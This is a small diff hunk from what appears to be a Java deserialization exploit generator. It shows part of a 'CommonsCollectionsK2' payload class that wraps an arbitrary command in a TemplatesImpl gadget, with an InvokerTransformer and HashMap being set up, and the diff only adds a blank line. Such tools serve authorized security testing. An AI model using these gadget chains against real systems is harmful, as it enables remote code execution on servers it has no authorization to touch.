@@ -15,6 +15,7 @@ public class CommonsCollectionsK2 implements ReleaseableObjectPayload<Object> {
 
     public Object getObject(String command) throws Exception {
         final Object templates;
+
         templates = Gadgets.createTemplatesImpl(command);
         InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
         HashMap<String, String> innerMap    = new HashMap<String, String>();
